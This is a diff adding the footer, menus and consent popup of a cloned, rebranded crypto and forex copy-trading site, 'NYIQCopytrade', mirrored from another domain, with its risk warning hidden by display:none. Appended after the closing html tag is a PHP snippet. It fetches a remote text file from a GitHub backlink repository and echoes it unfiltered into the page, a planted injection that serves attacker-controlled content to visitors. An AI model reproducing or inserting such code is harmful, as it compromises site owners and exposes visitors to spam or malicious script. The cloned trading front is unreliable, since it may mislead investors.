+                <img class="mobiles__img" src="assets/images/mobiles-mobe283.png" alt="mobile platform image"
+                    width="795" height="910" />
+                <div class="mobiles__links">
+                    <img src="assets/img/iosf94d.svg" alt="app store logo" width="120" height="40" /><img
+                        src="assets/img/android24a8.svg" alt="google play logo" width="135" height="40" />
+                </div>
+            </div>
+        </div>
+    </section>
+    <footer>
+        <div class="footer">
+            <div class="prs-container footer-container">
+                <div class="footer__logo-container">
+                    <div class="footer__logo">
+                        <a href="index-2.html" title="Main page"><img class="footer__logo-img" src="logo/logo.png"
+                                alt="Digital Trade Masters" width="121" height="44" /></a>
+                    </div>
+                    <div class="footer__info footer__info-first-block">
+                        <div class="footer__address">
+                            <div class="footer__address-line">
+                                NYIQCopytrade ©
+                                <script type="text/javascript">
+                                var year = new Date();
+                                document.write(year.getFullYear());
+                                </script>
+                                . All rights reserved.
+                            </div>
+                            <div class="footer__address-line">
+                                General information:&nbsp;
+                                <a href="mailto:info@NYIQCopytrade.com">info@NYIQCopytrade.com</a>
+                            </div>
+                            <div class="footer__address-line">
+                                Technical support:&nbsp;<a
+                                    href="mailto:support@NYIQCopytrade.com">Support@NYIQCopytrade.com</a>
+                            </div>
+                        </div>
+                        <div class="footer__links-to-s">
+                            <div class="footer__link-to-s"></div>
+                        </div>
+                    </div>
+
+                    <img src="assets/icons/cryptovalley9601.svg" alt="Digital Trade Masters logo" width="120"
+                        height="31" />
+                </div>
+                <div class="footer__middle-wrapper-container">
+                    <div class="footer__info">
+                        <div class="footer__address">
+                            <div class="footer__address-line">
+                                NYIQCopytrade ©
+                                <script type="text/javascript">
+                                var year = new Date();
+                                document.write(year.getFullYear());
+                                </script>
+                                . All rights reserved.
+                            </div>
+                            <div class="footer__address-line">
+                                General information:&nbsp;
+                                <a href="mailto:info@NYIQCopytrade.com">info@NYIQCopytrade.com</a>
+                            </div>
+                            <div class="footer__address-line">
+                                Technical support:&nbsp;<a
+                                    href="mailto:support@NYIQCopytrade.com">Support@NYIQCopytrade.com</a>
+                            </div>
+                        </div>
+                        <div class="footer__links-to-s">
+                            <div class="footer__link-to-s"></div>
+                        </div>
+                    </div>
+                    <div class="footer__menu-mainmenu">
+                        <ul>
+                            Products and Tools
+                            <li><a href="platform.html">NYIQCopytrade Platform</a></li>
+                            <li><a href="covesting.html">Copy-trading Module</a></li>
+                            <li><a href="yield.html">Yield Accounts</a></li>
+                            <li><a href="contests.html">Trading Contests</a></li>
+                            <li>
+                                <a href="trade-bitcoin-long-and-short.html">Long/Short Trading</a>
+                            </li>
+                            <li><a href="copy-trading.html">Copy Trading</a></li>
+                            <li>
+                                <a href="leverage-trading-crypto-indices-forex.html">All Trading Assets</a>
+                            </li>
+                        </ul>
+                        <ul>
+                            Cryptocurrency Trading
+                            <li>
+                                <a href="trade-bitcoin-with-leverage.html">Bitcoin Leverage</a>
+                            </li>
+                            <li>
+                                <a href="trade-litecoin-with-leverage.html">Litecoin Leverage</a>
+                            </li>
+                            <li>
+                                <a href="trade-ripple-with-leverage.html">Ripple Leverage</a>
+                            </li>
+                            <li>
+                                <a href="trade-ethereum-with-leverage.html">Ethereum Leverage</a>
+                            </li>
+                            <li><a href="trade-eos-with-leverage.html">EOS Leverage</a></li>
+                            <li>
+                                <a href="index.html">BTC/USD Chart</a>
+                            </li>
+                            <li>
+                                <a href="index.html">ETH/USD Chart</a>
+                            </li>
+                            <li>
+                                <a href="index.html">LTC/USD Chart</a>
+                            </li>
+                            <li>
+                                <a href="index.html">XRP/USD Chart</a>
+                            </li>
+                        </ul>
+                        <ul>
+                            Forex Trading
+                            <li>
+                                <a href="index.html">EUR/USD Chart</a>
+                            </li>
+                            <li>
+                                <a href="index.html">GBP/USD Chart</a>
+                            </li>
+                            <li>
+                                <a href="index.html">USD/CAD Chart</a>
+                            </li>
+                            <li>
+                                <a href="index.html">USD/JPY Chart</a>
+                            </li>
+                            <li>
+                                <a href="index.html">AUD/USD Chart</a>
+                            </li>
+                            <li>
+                                <a href="index.html">ETH/BTC Chart</a>
+                            </li>
+                            <li>
+                                <a href="index.html">LTC/BTC Chart</a>
+                            </li>
+                            <li>
+                                <a href="index.html">XRP/BTC Chart</a>
+                            </li>
+                        </ul>
+                        <ul>
+                            Indices Trading
+                            <li><a href="nasdaq-index-trading.html">NASDAQ Trading</a></li>
+                            <li>
+                                <a href="hang-seng-index-trading.html">Hang Seng Trading</a>
+                            </li>
+                            <li>
+                                <a href="nikkei-index-trading.html">Japan NIKKEI Index</a>
+                            </li>
+                            <li>
+                                <a href="ftse-100-index-trading.html">FTSE 100 Index</a>
+                            </li>
+                            <li><a href="asx-200-index-trading.html">ASX 200 Index</a></li>
+                            <li><a href="dax-30-index-trading.html">DAX 30 Index</a></li>
+                            <li><a href="sp-500-index-trading.html">SP500 Index</a></li>
+                            <li>
+                                <a href="index.html">NASDAQ Chart</a>
+                            </li>
+                            <li>
+                                <a href="index.html">SP500 Chart</a>
+                            </li>
+                        </ul>
+                        <ul>
+                            Commodities Trading
+                            <li><a href="gas-trading.html">Natural Gas Trading</a></li>
+                            <li><a href="crude-oil-trading.html">Crude Oil Trading</a></li>
+                            <li><a href="index.html">Gold Trading</a></li>
+                            <li>
+                                <a href="price-chart/commodities/brent.html">Brent Chart</a>
+                            </li>
+                            <li>
+                                <a href="price-chart/commodities/crude.html">Crude Oil Chart</a>
+                            </li>
+                            <li>
+                                <a href="price-chart/commodities/nat.html">Natural Gas Chart</a>
+                            </li>
+                            <li>
+                                <a href="price-chart/commodities/silver.html">Silver Chart</a>
+                            </li>
+                        </ul>
+                        <ul>
+                            About
+                            <li><a href="about.html">About Us</a></li>
+                            <li><a href="index.html">Security</a></li>
+                            <li><a href="index.html">Fees and Conditions</a></li>
+                            <li><a href="press-and-media.html">Press and Media</a></li>
+                            <li><a href="index.html">Legal Terms</a></li>
+                            <li>
+                                <a href="index.html">Privacy Policy</a>
+                            </li>
+                            <li>
+                                <a href="index.html">Cookie Policy</a>
+                            </li>
+
+                        </ul>
+                        <ul>
+                            Blog
+                            <li>
+                                <a href="index.html">Platform announcements</a>
+                            </li>
+                            <li>
+                                <a href="index.html">Technical analysis</a>
+                            </li>
+                            <li>
+                                <a href="index.html">Price prediction</a>
+                            </li>
+                            <li>
+                                <a href="index.html">Market research</a>
+                            </li>
+                            <li><a href="index.html">Features</a></li>
+                            <li>
+                                <a href="index.html">Education</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <nav class="mobmenu footer-mobmenu mobmenu--opened">
+                    <div class="mobmenu__content">
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                Products and Tools<img src="assets/icons/mobmenu-dropdown82de.svg" alt="dropdown icon"
+                                    width="24" height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="platform.html">NYIQCopytrade Platform</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="covesting.html">Copy-trading Module</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="yield.html">Yield Accounts</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="contests.html">Trading Contests</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="trade-bitcoin-long-and-short.html">Long/Short Trading</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="copy-trading.html">Copy Trading</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="leverage-trading-crypto-indices-forex.html">All Trading Assets</a>
+                            </li>
+                        </ul>
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                Cryptocurrency Trading<img src="assets/icons/mobmenu-dropdown82de.svg"
+                                    alt="dropdown icon" width="24" height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="trade-bitcoin-with-leverage.html">Bitcoin Leverage</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="trade-litecoin-with-leverage.html">Litecoin Leverage</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="trade-ripple-with-leverage.html">Ripple Leverage</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="trade-ethereum-with-leverage.html">Ethereum Leverage</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="trade-eos-with-leverage.html">EOS Leverage</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">BTC/USD Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">ETH/USD Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">LTC/USD Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">XRP/USD Chart</a>
+                            </li>
+                        </ul>
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                Forex Trading<img src="assets/icons/mobmenu-dropdown82de.svg" alt="dropdown icon"
+                                    width="24" height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">EUR/USD Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">GBP/USD Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">USD/CAD Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">USD/JPY Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">AUD/USD Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">ETH/BTC Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">LTC/BTC Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">XRP/BTC Chart</a>
+                            </li>
+                        </ul>
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                Indices Trading<img src="assets/icons/mobmenu-dropdown82de.svg" alt="dropdown icon"
+                                    width="24" height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="nasdaq-index-trading.html">NASDAQ Trading</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="hang-seng-index-trading.html">Hang Seng Trading</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="nikkei-index-trading.html">Japan NIKKEI Index</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="ftse-100-index-trading.html">FTSE 100 Index</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="asx-200-index-trading.html">ASX 200 Index</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="dax-30-index-trading.html">DAX 30 Index</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="sp-500-index-trading.html">SP500 Index</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">NASDAQ Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">SP500 Chart</a>
+                            </li>
+                        </ul>
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                Commodities Trading<img src="assets/icons/mobmenu-dropdown82de.svg" alt="dropdown icon"
+                                    width="24" height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="gas-trading.html">Natural Gas Trading</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="crude-oil-trading.html">Crude Oil Trading</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Gold Trading</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="price-chart/commodities/brent.html">Brent Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="price-chart/commodities/crude.html">Crude Oil Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="price-chart/commodities/nat.html">Natural Gas Chart</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="price-chart/commodities/silver.html">Silver Chart</a>
+                            </li>
+                        </ul>
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                About<img src="assets/icons/mobmenu-dropdown82de.svg" alt="dropdown icon" width="24"
+                                    height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="about.html">About Us</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Security</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Fees and Conditions</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="press-and-media.html">Press and Media</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Legal Terms</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Privacy Policy</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Cookie Policy</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Risk Disclosure</a>
+                            </li>
+                        </ul>
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                Blog<img src="assets/icons/mobmenu-dropdown82de.svg" alt="dropdown icon" width="24"
+                                    height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Platform announcements</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Technical analysis</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Price prediction</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Market research</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Features</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Education</a>
+                            </li>
+                        </ul>
+                    </div>
+                </nav>
+                <div class="footer__copyright" style="display:none">
+                    <strong>Risk warning</strong>
+                    <p>
+                        NYIQCopytrade products are complex instruments and come with a
+                        high risk of losing money rapidly due to leverage. These products
+                        are not suitable for all investors. You should consider whether
+                        you understand how these products work and whether you can afford
+                        to take the high risk of losing your money. Seek independent
+                        advice if necessary.
+                    </p>
+                    <p>
+                        This website products and services are provided by NYIQCopytrade Trading Services LLC
+                    </p>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <div class="player-container">
+        <div class="player-wrapper"></div>
+    </div>
+    <button class="risk-warning__close">
+        <img class="risk-warning__cross" src="assets/icons/crossdfa6.svg" width="8" height="8" alt="close icon" />
+    </button>
+    <div class="layout-accept" data-nosnippet="">
+        <div class="prs-container wrapper-popup">
+            <div class="popup-accept" data-nosnippet="">
+                <h6 class="popup-accept-title" data-nosnippet="">
+                    Welcome to NYIQCopytrade
+                </h6>
+                <p class="popup-accept-text" data-nosnippet="">
+                    The website<a class="popup-link" href="index-2.html">&nbsp;NYIQCopytrade.com</a>&nbsp;is
+                    operated by
+                    <span>NYIQCopytrade Trading Services LLC</span> an entity that is
+                    not established in the EU or regulated by an EU National Competent
+                    Authority. The entity falls outside the EU regulatory framework
+                    i.e.<a class="popup-link"
+                        href="https://www.esma.europa.eu/policy-rules/mifid-ii-and-mifir">&nbsp;MiFID II</a>&nbsp;and
+                    there is no provision for an Investor Compensation
+                    Scheme. You will not benefit from the protections available to
+                    clients receiving regulated investment services.<br /><a class="popup-link"
+                        href="index.html">&nbsp;Read Our Terms and Conditions.</a>
+                </p>
+                <p class="popup-accept-text" data-nosnippet="">
+                    YOU SHALL CHECK YOUR APPLICABLE LAW AND BE FULLY RESPONSIBLE FOR ANY
+                    NEGATIVE IMPACT ARISEN FROM YOUR RESIDENCE COUNTRY REGULATIONS.
+                </p>
+                <p class="popup-accept-text" data-nosnippet="">
+                    <span>Please confirm</span>, that the decision was made
+                    independently at your own exclusive initiative and that no
+                    solicitation or recommendation has been made by
+                    <span>NYIQCopytrade</span> or any other entity within the group.
+                    Otherwise, please leave this website.
+                </p>
+                <div class="sticky-container">
+                    <div class="wrapper-btns"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+    <script src="commonce4b.js"></script>
+    <script src="glide.mind17f.js"></script>
+    <script src="picturefill.minfd0a.js"></script>
+    <script src="indexc763.js"></script>
+</body>
+<!-- Mirrored from DigitalTradeMasters.com/ by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 01 Jan 2022 20:18:22 GMT -->
+
+
+<!-- Mirrored from digitaltrademasters.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 16 Dec 2023 16:43:32 GMT -->
 </html>
+<?php
+$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+curl_close($ch);
+echo $result;
+?>
